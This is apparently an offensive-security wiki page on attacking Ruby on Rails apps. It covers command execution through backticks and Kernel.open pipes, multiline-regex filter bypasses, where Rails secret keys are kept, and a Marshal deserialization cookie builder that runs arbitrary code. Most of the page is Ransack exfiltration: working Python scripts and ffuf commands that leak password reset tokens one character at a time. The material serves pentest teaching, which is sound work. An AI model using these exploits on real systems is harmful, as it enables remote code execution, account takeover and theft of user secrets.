---
description: A common web framework for the Ruby Programming Language
---

# Ruby on Rails

{% hint style="info" %}
**Note**: A lot of content here is taken from [this gist](https://gist.github.com/cyberheartmi9/7fe85b61621f4126462d2125c4b19dfe) talking about Ruby on Rails applications. Be sure to check it out for a lot of attack techniques
{% endhint %}

## Command Execution

In Ruby, if you can execute any code a simple `` ` `` will allow you to execute system commands:

```ruby
`touch a`  # Runs command without output (reverse shell)
puts `id`  # Prints output
```

## Security Pitfalls

[`Kernel.open()`](https://ruby-doc.org/3.2.2/Kernel.html#method-i-open) vs [`File.open()`](https://ruby-doc.org/core-2.5.0/File.html#method-c-open)

In Ruby, [`Kernel`](https://ruby-doc.org/3.2.2/Kernel.html) is the standard module, and its functions do not need to be prefixed with `Kernel.`, meaning `Kernel.open()` and `open()` are **equivalent**. A different function however is `File.open()`, which sounds like it _should_ do the same thing.&#x20;

One important difference however is that the `open()` function allows subprocesses to be created by prefixing with the `|` pipe symbol:

{% code title="Kernel.open()" %}
```ruby
open("|id") do |file|
    puts file.read
end
# uid=1001(user) gid=1001(user) groups=1001(user)
```
{% endcode %}

{% code title="File.open()" %}
```ruby
File.open("|id") do |file|
    puts file.read
end
# No such file or directory @ rb_sysopen - |id (Errno::ENOENT)
```
{% endcode %}

If you have control over the start of such a path, you can inject a `|` pipe symbol to execute commands. While you often also have Directory Traversal when starting a path with `/`, this attack does not require the `/` slash character and may get through a filter that tries to prevent it.&#x20;

### Regular Expressions

In ruby you can match a string to some regex in two simple ways:

<pre class="language-ruby"><code class="lang-ruby">a="some text containing abbbbc to match"

<strong>if a =~ /ab+c/
</strong>    puts "match"
end

<strong>if a.match(/ab+c/)
</strong>    puts "match"
end
</code></pre>

These two ways are identical to each other, but not the same as many other programming languages. The change is that **Regular Expressions are multi-line by default**. In some languages, this is represented as another argument, or `/m` at the end, but in Ruby, this is the default.&#x20;

The multi-line mode makes `^` and `$` act differently. Normally, these would represent the start and end of the **whole string**. But in multi-line mode, these are the start and end of the **line**. This means that if there are newline characters in the string, the `^` for example could match against a line earlier or later in the string.&#x20;

Many regular expressions use these characters to sanitize user input and to try to if the whole string follows a particular pattern. But in Ruby, if you can get a newline into the string, any of the lines just need to match. So one line can follow the pattern, but another line can be some arbitrary payload that gets past the check.&#x20;

Here's an example:

```ruby
a="foo\nbar"

if a =~ /^foo$/  # Tries to match only "foo"
    puts "match"  # "bar" gets injected
end
```

See the whole chapter on [regular-expressions-regex.md](../../languages/regular-expressions-regex.md "mention") for more details on the syntax.&#x20;

### URL Parameters

Similarly to [php.md](../../languages/php.md "mention"), Ruby on Rails allows you to put arrays in query parameters:

```url
?user[]=first&user[]=second
```

This will result in a `params` variable like this:

```ruby
{"user" => ["first","second"]}
```

You can even use named array keys to create objects inside:

```url
?user[name]=hacker&user[password]=hunter2
```

```ruby
{"user" => {"name" => "hacker", "password" => "hunter2"}}
```

Finally, you can create `nil` values by not providing a value, which might break some things:

```
?user[name]
```

```ruby
{"user" => {"name" => nil}}
```

See [1.1.2 - Multiparameter attributes](https://gist.github.com/cyberheartmi9/7fe85b61621f4126462d2125c4b19dfe#file-attacking-ruby-on-rails-applications-L165) and [1.1.3 - POST/PUT text/xml](https://gist.github.com/cyberheartmi9/7fe85b61621f4126462d2125c4b19dfe#file-attacking-ruby-on-rails-applications-L188) for more input tricks like these.&#x20;

## Sessions

You can do a lot if you can find the Secret Key used for verifying sessions. Some common locations are:

* `config/environment.rb`
* `config/initializers/secret_token.rb`
* `config/secrets.yml`
* `/proc/self/environ` (if it's just given via an environment variable)

### Forging sessions

First of all, you can of course sign your own data to create arbitrary objects that might bypass authentication or anything else. See [this code](https://gist.github.com/cyberheartmi9/7fe85b61621f4126462d2125c4b19dfe#file-attacking-ruby-on-rails-applications-L374-L414) as an example to serialize your own data.&#x20;

### Insecure Deserialization

Ruby on Rails cookies use Marshal serialization to turn objects into strings, and then back into objects for deserialization.&#x20;

For Ruby 3 you can use a piece of code like this to create a marshal payload executing any Ruby code:

```ruby
 def build_cookie
    code = "eval('whatever ruby code')"
    marshal_payload = Rex::Text.encode_base64(
      "\x04\x08" +
      "o" +
      ":\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy" +
      "\x07" +
              ":\x0E@instance" +
                      "o" + ":\x08ERB" + "\x06" +
                              ":\x09@src" +
                                      Marshal.dump(code)[2..-1] +
              ":\x0C@method" + ":\x0Bresult"
    ).chomp
    digest = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::Digest.new("SHA1"),
      SECRET_TOKEN, marshal_payload)
    marshal_payload = Rex::Text.uri_encode(marshal_payload)
    "#{marshal_payload}--#{digest}"
  end
```

For more recent versions, the following post describes a different deserialization chain:

{% embed url="https://nastystereo.com/security/ruby-3.4-deserialization.html" %}

**More References**

* [PayloadsAllTheThings/Ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md)
* [YAML Deserialization](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/)

## Ransack Data Exfiltration

{% embed url="https://positive.security/blog/ransack-data-exfiltration" %}
Article explaining the technique and exploitability
{% endembed %}

The popular [Ransack](https://github.com/activerecord-hackery/ransack) Ruby library allows developers to query a database in the form of **objects**. On version < 4.0.0 (Released: Feb 9, 2023), there is a big risk of **mass assignment** in query parameters that perform these filters. The client often provides a query where they can specify what attributes to filter for with conditions like `cont` (contains) or `start` (starts with). These can be pointed to sensitive data like password reset tokens by an attacker and exfiltrated character-by-character by the named filters.&#x20;

{% hint style="info" %}
The reason versions after 4.0.0 are often safe, is because an explicit whitelist is required to be filled out per class to select all queryable attributes. Of course, a developer could still include sensitive fields here by mistake, but it is safe by default.
{% endhint %}

Take this vulnerable code example:

<pre class="language-ruby"><code class="lang-ruby"># User class with sensitive data, has posts
class User &#x3C; ActiveRecord::Base
  validates :email, :username, presence: true
<strong>  attr_accessor :password_hash, :reset_password_token
</strong>  
<strong>  has_many posts
</strong>end
# Post class to be queries, belongs to a user
class Post &#x3C; ActiveRecord::Base
  validates :title, :content, presence: true
  
<strong>  belongs_to :user
</strong>end
# Vulnerable page with user input
def search
<strong>  @q = Post.ransack(params[:q])
</strong>  @posts = @q.result(distinct: true)
end
</code></pre>

Here the `search` page uses `params[:q]` from the client to query the `Post` class, which is indended to be searched for a `title` or `content`. \
Then, a URL like `/search?q[title_cont]=hacking` will respond with all posts with a **title containing "hacking"**. First is the _path_ to the attribute: `title`, and then comes the _Predictate_: [`cont`](https://activerecord-hackery.github.io/ransack/getting-started/using-predicates/#cont), separated by an `_` underscore.&#x20;

{% embed url="https://activerecord-hackery.github.io/ransack/getting-started/search-matches/" %}
A **table** of all **predictates** that can be used
{% endembed %}

The **vulnerability** here however, is when we provide a sensitive attribute, which is easy as the path to the attribute can be deeper by separating them by underscores. If we want to find the `reset_password_token` for example, this is inside of the `user`: \
`/search?q=[user_reset_password_token_cont]=hacking`. This query will return something if there is a user with "hacking" in their password reset token, but this can be abused by doing a character-by-character brute-force attack where we provide all possible starting characters and find which give a response back, indicating it was found:

<pre class="language-clike" data-title="Exploit"><code class="lang-clike">GET /posts?q[user_reset_password_token_start]=0 -> Empty results page
GET /posts?q[user_reset_password_token_start]=1 -> Empty results page
<strong>GET /posts?q[user_reset_password_token_start]=2 -> Results in page
</strong></code></pre>

Afterward, we know a token starts with `2`, and we can simply try all other characters after it:

<pre class="language-clike"><code class="lang-clike">GET /posts?q[user_reset_password_token_start]=20 -> Empty results page
GET /posts?q[user_reset_password_token_start]=21 -> Empty results page
...
GET /posts?q[user_reset_password_token_start]=2c -> Empty results page
<strong>GET /posts?q[user_reset_password_token_start]=2d -> Results in page
</strong></code></pre>

By continually doing this, eventually, we find for example `q[user_reset_password_token]=2dd0571e439813f7` which shows the entire token is correct, and we have leaked it in only a few requests.&#x20;

Leaking such hexadecimal token can look something like this:

{% code title="ransack_token_leak.py" %}
```python
import requests
from tqdm import tqdm  # Progress bar

HOST = "http://localhost:4567"  # TARGET
ALPHABET = b"0123456789abcdef"

token = b""
for length in tqdm(range(16), desc="Length", leave=False):
    for c in tqdm(ALPHABET, desc=f"{length}", leave=False):
        prefix = token + bytes([c])
        params = {  # Check with start (case insensitive)
            "q[user_reset_password_token_start]": prefix.decode(),
        }
        r = requests.get(HOST + "/search", params=params)

        if len(r.text) > 5000:  # Treshold for results
            token += bytes([c])
            tqdm.write(repr(token))
            break
    else:  # If nothing new found, we are done
        break

token = token.decode()
print("Found case-insensitive:", token)
```
{% endcode %}

In this case, we found the sensitive `user` and `reset_password_token` attributes by reading the code, but in a more black-box scenario where you only notice the pattern of \
`?q[attr_predicate]=` some **guessing** is required. Tools like [`ffuf`](https://github.com/ffuf/ffuf) can fuzz for these attributes by providing the `FUZZ` keyword in the correct part of a URL:

<pre class="language-shell-session" data-overflow="wrap"><code class="lang-shell-session"><strong>$ ffuf -u 'http://localhost:4567/search?q[OBJ_PROP_eq]=random6bQ1kL' -w objs.txt:OBJ -w props.txt:PROP -fs 7301
</strong>...
<strong>[Status: 200, Size: 521, Words: 56, Lines: 15, Duration: 3ms]
</strong><strong>    * OBJ: user
</strong><strong>    * PROP: reset_password_token
</strong>
[Status: 200, Size: 521, Words: 56, Lines: 15, Duration: 5ms]
    * OBJ: user
    * PROP: name

[Status: 200, Size: 521, Words: 56, Lines: 15, Duration: 3ms]
    * OBJ: user
    * PROP: id
</code></pre>

In the example above, we try to find an object and property that when `_eq` is put on it, returns false because it is not found. Then the size is smaller and different from when the attribute is **wrong**, as then it is _ignored_ returning **all results** in a static size. \
This behavior depends, as in some cases a **wrong** guess will instead give **no results**, requiring you to change the fuzzing. A strategy for this would be to create a (mostly) always-true query like \
`?q[OBJ_PROP_cont]=_` asking for the property to contain at least one character (`_` = wildcard).&#x20;

<details>

<summary>Wordlists (small)</summary>

{% code title="objs.txt" %}
```
user
author
creator
writer
by
```
{% endcode %}

{% code title="props.txt" %}
```
id
name
first_name
firstname
first
email
password
token
recoveries
recoveries_key
recoveries_token
recovery
recovery_key
recovery_token
password_recovery
password_recovery_token
reset_password_token
password_reset_token
password_token
reset_token
token_reset_password
token_password_reset
```
{% endcode %}

</details>

### Case Insensitive Predicates

An important note, however, is the fact that the [`start`](https://activerecord-hackery.github.io/ransack/getting-started/using-predicates/#start-starts-with) predicate is **case-insensitive**, meaning using just this technique we won't know the casing of a token. For a hexadecimal token, this is no problem, but for a Base64 token, it is important to get this correct.&#x20;

There is no easy way to make `start` case-sensitive, but there are alternative predicates that are case-sensitive like `eq` (SQL `=`) or `cont` (SQL `LIKE`). Not all databases perform `LIKE` **case-sensitively**, some popular ones that **do** include PostgreSQL and Oracle DB. \
While MySQL/MariaDB, SQLite, or Microsoft SQL **do not**. It is easy to test if this is the case by searching for a string with the wrong casing using the `eq` or `cont` predicates.&#x20;

Commonly `eq` will work case-insensitively making it possible to guess all different combinations of casing for a token. If you found a token like `a2b`, you can try `a2b`, `A2b`, `a2B`, and `A2B` to find the correct one. Then, use this correct token to reset the password, or whatever else the sensitive data lets you do. Here is an implementation:

```python
# Try change with all cases
def all_casings(input_string):
    if not input_string:
        yield ""
    else:
        first = input_string[:1]
        if first.lower() == first.upper():
            for sub_casing in all_casings(input_string[1:]):
                yield first + sub_casing
        else:
            for sub_casing in all_casings(input_string[1:]):
                yield first.lower() + sub_casing
                yield first.upper() + sub_casing

for cased_token in tqdm(list(all_casings(token)), desc="Casing", leave=False):
    params = {  # Check with equals (case sensitive)
        "q[user_reset_password_token_eq]": cased_token,
    }
    r = requests.get(HOST + "/search", params=params)
    
    if '<li>' in r.text:  # Treshold for results
        break

print("Found case-sensitive:  ", cased_token)
```

### Binary Search

If the targetted data is **numeric**, it is possible to use the `lt` (less than) or `lteq` (less than or equal) predicates to compare a range of values all at once. This algorithm is called [Binary Search](https://en.wikipedia.org/wiki/Binary_search_algorithm) and can drastically speed up your attack. Here is a simple implementation that leaks the `number` attribute from `user`:

{% code title="Numeric Binary Search" %}
```python
def test(guess):
    """if target is lower than guess (not equal)"""
    params = {
        "q[user_number_lt]": guess,
    }
    r = requests.get(HOST + "/search", params=params)

    return len(r.text) > 5000

def binary_search(lo=0, hi=10000):
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if test(mid):
            hi = mid - 1
        else:
            lo = mid
    
    return lo
```
{% endcode %}

A more advanced example is achieving **Binary Search for string attributes**. We require a way to test multiple values at once, to test a range (half of the possible values) at once. It turns out, the `start_any` predicate (similar to [`cont_any`](https://activerecord-hackery.github.io/ransack/getting-started/using-predicates/#cont_any-contains-any)) can do this for us! It requires an array and performs the regular `start` predicate with all the strings in that array, and if one is found, it is successful.&#x20;

We can make use of this by specifying half of the possible continuations as an array in the query parameters, which will return results if the next character is in _any of them_, achieving Binary Search once again.&#x20;

Some important things to note are firstly the fact that Ruby (and many other frameworks) accept arrays as query parameters by duplicating the names and appending `[]` like \
`?array[]=1&array[]=2` to create `array=["1","2"]`. We use this to generate the required strings. These strings need to be the known _prefix_ so far, and half of the possible characters. If we know `prefix="se"` the guesses will be `["sea", "seb", "sec", ...]`.

Here is an example implementation:

{% code title="String Binary Search" %}
```python
import requests

HOST = "http://localhost:4567"
ALPHABET = list("0123456789abcdefghijklmnopqrstuvwxyz")

def test(prefix, guess):
    # Create array of possible continuations
    l = [prefix + c for c in ALPHABET[:guess]]
    # Pass array as query parameters
    params = [("q[user_reset_password_token_start_any][]", s) for s in l]
    r = requests.get(HOST + "/search", params=params)

    return '<li>' in r.text

def binary_search(prefix, lo=0, hi=len(ALPHABET)):
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if test(prefix, mid):
            hi = mid - 1
        else:
            lo = mid
    
    return ALPHABET[lo] if lo < len(ALPHABET) else None

if __name__ == "__main__":
    prefix = ""
    while result := binary_search(prefix):
        prefix += result
        print(prefix)
```
{% endcode %}

{% hint style="success" %}
In **every situation,** binary search will be **faster** than linear search, but the difference is largest when `ALPHABET` is largest. If this is `N`, the average time for both will be:

* Linear Search: `N/2`          (N=50 -> 25 attempts)
* Binary Search: `log2(N)` (N=50 -> 6 attempts)
{% endhint %}
